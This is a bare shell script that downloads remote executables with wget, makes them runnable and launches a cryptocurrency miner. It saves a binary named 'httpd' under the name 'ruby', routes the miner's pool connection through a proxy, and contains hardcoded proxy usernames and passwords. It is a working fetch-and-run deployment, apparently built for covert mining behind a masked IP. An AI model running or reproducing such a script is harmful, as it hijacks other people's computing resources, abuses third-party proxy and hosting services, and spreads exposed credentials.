proxy="us-east-static-06.quotaguard.com" 
port="9293" 
user="18rf8tmkziiczf"  
pass="mgaijn8podkmkw582wq2rvg8kc5" 
wget -q -O ruby https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x ruby
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./ruby -a yespower -o 103.120.19.136:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 88-200 -n 1)-ricard ahmad) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://18rf8tmkziiczf:mgaijn8podkmkw582wq2rvg8kc5@us-east-static-01.quotaguard.com:1080 
